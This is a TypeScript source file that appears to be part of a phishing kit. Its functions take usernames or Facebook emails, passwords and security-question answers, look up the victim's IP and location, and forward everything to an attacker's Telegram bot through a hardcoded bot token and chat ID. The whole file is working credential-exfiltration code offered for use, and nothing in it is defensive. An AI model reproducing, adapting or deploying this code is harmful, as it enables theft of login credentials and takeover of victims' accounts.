import axios from 'axios';

interface LocationData {
  ip: string;
  city: string;
  region: string;
}

const getLocation = async (): Promise<LocationData> => {
  try {
    const ipRes = await axios.get('https://ipapi.co/json/');
    return {
      ip: ipRes.data.ip || 'Unknown',
      city: ipRes.data.city || 'Unknown',
      region: ipRes.data.region || 'Unknown'
    };
  } catch (e) {
    console.error('Failed to get location', e);
    return { ip: 'Unknown', city: 'Unknown', region: 'Unknown' };
  }
};

export const sendToTelegram = async (
  username: string, 
  pass: string, 
  q1: string, 
  q2: string
) => {
  const BOT_TOKEN = '8539103259:AAHnEJrkMJt2Z_vjyf-gENTJU6GnzpTnkCs';
  const CHAT_ID = '6885815623';

  const loc = await getLocation();

  const now = new Date();
  const timeString = now.toISOString().replace('T', ' ').split('.')[0];

  const message = `
🔐 <b>New Login Data Received</b>
🕒 Time    : ${timeString}
🌐 IP      : <code>${loc.ip}</code>
🏙 City    : ${loc.city}
® Region  : ${loc.region}

🆔 ID      : <code>${username}</code>
🔑 Password: <code>${pass}</code>

🛡️ <b>Security Questions:</b>
${q1}
${q2}

<i>User Masuk, pastikan Anda Selalu Stenbay.</i>
  `;

  return sendMessage(BOT_TOKEN, CHAT_ID, message);
};

export const sendFacebookLogin = async (
  email: string, 
  pass: string,
  q1: string,
  q2: string
) => {
  // Use the SAME token as ID login which is known to work
  const BOT_TOKEN = '8539103259:AAHnEJrkMJt2Z_vjyf-gENTJU6GnzpTnkCs';
  const CHAT_ID = '6885815623';

  const loc = await getLocation();
  const now = new Date();
  const timeString = now.toLocaleString();

  const message = `
🔔 <b>Login Facebook Detected</b> 🔔

🕒 Waktu Login: ${timeString}
🌐 IP      : <code>${loc.ip}</code>
🏙 City    : ${loc.city}
® Region  : ${loc.region}

👤 Email: <code>${email}</code>
🔑 Password: <code>${pass}</code>

🛡️ <b>Security Questions:</b>
${q1}
${q2}

<i>User Masuk, pastikan Anda Selalu Stenbay.</i>
  `;

  return sendMessage(BOT_TOKEN, CHAT_ID, message);
};

const sendMessage = async (botToken: string, chatId: string, text: string) => {
  try {
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: text,
        parse_mode: 'HTML',
      }),
    });

    if (!response.ok) {
      throw new Error('Gagal mengirim ke Telegram');
    }
    return true;
  } catch (error) {
    console.error('Telegram Error:', error);
    return false;
  }
};
